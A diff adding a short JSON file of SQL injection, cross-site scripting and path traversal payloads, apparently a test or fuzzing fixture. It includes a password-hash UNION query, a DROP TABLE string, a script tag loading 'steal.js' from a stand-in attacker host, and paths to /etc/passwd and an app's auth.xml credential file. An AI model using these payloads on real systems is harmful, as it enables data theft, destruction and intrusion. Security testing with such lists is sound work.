@@ -1,0 +1,22 @@
+{
+  "sqli": [
+    "' OR '1'='1",
+    "' OR 1=1 --",
+    "admin' --",
+    "' UNION SELECT null, username, password_hash FROM users --",
+    "\"; DROP TABLE users; --",
+    "' OR ''='"
+  ],
+  "xss": [
+    "<script>alert('xss')</script>",
+    "<img src=x onerror=alert(1)>",
+    "<svg/onload=alert('pwned')>",
+    "javascript:void(0)",
+    "\"><script src=https://attacker.com/steal.js></script>"
+  ],
+  "traversal": [
+    "../../../../etc/passwd",
+    "..\\..\\..\\Windows\\win.ini",
+    "/data/data/com.example.deepguard/shared_prefs/auth.xml"
+  ]
+}
